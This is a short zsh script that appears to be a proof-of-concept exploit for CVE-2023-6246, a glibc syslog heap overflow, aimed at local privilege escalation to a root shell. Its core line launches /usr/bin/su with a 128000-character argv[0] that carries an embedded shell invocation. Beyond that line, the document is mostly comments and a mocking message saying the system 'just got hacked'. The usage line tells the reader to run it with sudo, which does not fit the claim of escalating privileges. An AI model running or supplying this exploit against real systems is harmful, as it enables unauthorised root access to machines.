#!/usr/bin/zsh
################################################################################
# $Id: cve-2023-6246... 2024-02-01 18-54-19 +0100 .m0rph $
################################################################################
# Description:
#
# +------------------------------------------------------------------------+
# | See poc.cve-2023-6246.heap-based-buffer-overflow-in-glibc.s-syslog.txt |
# +------------------------------------------------------------------------+
#
# ------------------------------------------------------------------------------
# Does a privilege escalation
#
# Usage:
#
#  $ sudo ./poc.cve-2023-6246
#
# ------------------------------------------------------------------------------
# How to check which glibc is installed:
#
#  $ ldd --version
#
################################################################################

# Here we use the Proof of Concept (PoC) to gain a root shell
# of the buffer overflow, a so called privilege escalation.
exec -a `printf '%0128000x' 1;sh 0<&2 1>&2` /usr/bin/su < /dev/null

print -l 'Does he print that?' # nope, he doesn't, just got hacked !!!


# EOF
